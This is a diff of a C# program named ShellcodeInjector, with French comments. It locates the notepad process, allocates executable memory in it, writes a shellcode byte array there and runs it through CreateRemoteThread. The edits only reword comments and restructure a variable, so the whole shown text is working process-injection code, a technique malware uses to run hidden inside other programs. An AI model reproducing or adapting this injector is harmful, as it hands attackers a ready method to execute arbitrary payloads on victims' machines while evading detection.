@@ -1,4 +1,4 @@
-using System;
+﻿using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 
@@ -41,7 +41,8 @@ namespace ShellcodeInjector
         {
             try
             {
-                // Recherche du processus cible "notepad"
+                // Trouver le processus cible "notepad"
+                Process targetProcess = null;
                 Process[] processes = Process.GetProcessesByName("notepad");
 
                 if (processes.Length == 0)
@@ -50,7 +51,7 @@ namespace ShellcodeInjector
                     return;
                 }
 
-                Process targetProcess = processes[0];
+                targetProcess = processes[0];
                 Console.WriteLine($"Injection dans le processus {targetProcess.ProcessName} PID {targetProcess.Id}");
 
                 // Shellcode qui lance notepad.exe (payload différent de calc.exe)
@@ -64,15 +65,15 @@ namespace ShellcodeInjector
                     0xC9, 0x48, 0xFF, 0xC1, 0xE2, 0xED, 0xC3
                 };
 
-                // Ouvrir un handle avec tous les droits sur le processus cible (nécessaire pour manipuler sa mémoire)
+                // Ouvrir le processus cible avec tous les accès
                 IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetProcess.Id);
                 if (hProcess == IntPtr.Zero)
                 {
-                    Console.WriteLine("Impossible d'ouvrir le processus cible. Vérifiez les permissions.");
+                    Console.WriteLine("Impossible d'ouvrir le processus cible.");
                     return;
                 }
 
-                // Allouer de la mémoire dans le processus distant avec droits d'exécution pour y copier le shellcode
+                // Allouer de la mémoire exécutable dans le processus cible
                 IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero,
                     (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
@@ -82,7 +83,7 @@ namespace ShellcodeInjector
                     return;
                 }
 
-                // Écrire le shellcode dans la mémoire allouée du processus cible
+                // Copier le shellcode dans la mémoire allouée
                 bool result = WriteProcessMemory(hProcess, allocMemAddress, shellcode, (uint)shellcode.Length, out _);
                 if (!result)
                 {
@@ -90,7 +91,7 @@ namespace ShellcodeInjector
                     return;
                 }
 
-                // Créer un thread distant pour exécuter le shellcode dans le processus cible
+                // Créer un thread distant pour exécuter le shellcode
                 IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero, 0, out _);
                 if (hThread == IntPtr.Zero)
                 {
@@ -98,13 +99,12 @@ namespace ShellcodeInjector
                     return;
                 }
 
-                // Attendre que le shellcode ait fini son exécution avant de fermer le programme
+                // Attendre la fin du thread distant
                 WaitForSingleObject(hThread, INFINITE);
                 Console.WriteLine("Injection terminée.");
             }
             catch (Exception ex)
             {
-                // Gestion basique des erreurs (à améliorer pour un usage réel)
                 Console.WriteLine($"Erreur : {ex.Message}");
             }
         }
